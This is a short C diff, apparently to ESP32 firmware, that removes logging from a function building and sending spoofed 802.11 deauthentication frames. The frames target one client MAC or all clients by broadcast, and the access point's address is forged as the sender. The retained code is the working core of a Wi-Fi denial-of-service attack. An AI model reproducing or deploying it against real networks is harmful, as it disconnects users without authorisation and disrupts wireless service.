@@ -55,16 +55,13 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
 
 void wsl_bypasser_send_deauth_frame(const uint8_t *ap_record,
                                     const uint8_t *client_mac) {
-  ESP_LOGI(TAG, "Building deauth frame...");
   uint8_t deauth_frame[sizeof(deauth_frame_default)];
 
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
   if (client_mac) {
     memcpy(&deauth_frame[4], client_mac, 6);
-    ESP_LOGI(TAG, "Target client: %02X:%02X:%02X:%02X:%02X:%02X", client_mac[0],
-             client_mac[1], client_mac[2], client_mac[3], client_mac[4],
-             client_mac[5]);
+
   } else {
     memset(&deauth_frame[4], 0xFF, 6); // broadcast
     ESP_LOGI(TAG, "Broadcast deauth");
@@ -73,7 +70,7 @@ void wsl_bypasser_send_deauth_frame(const uint8_t *ap_record,
   memcpy(&deauth_frame[10], ap_record, 6);
   memcpy(&deauth_frame[16], ap_record, 6);
 
-  ESP_LOG_BUFFER_HEX("DEAUTH_FRAME", deauth_frame, sizeof(deauth_frame));
+  
 
   wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
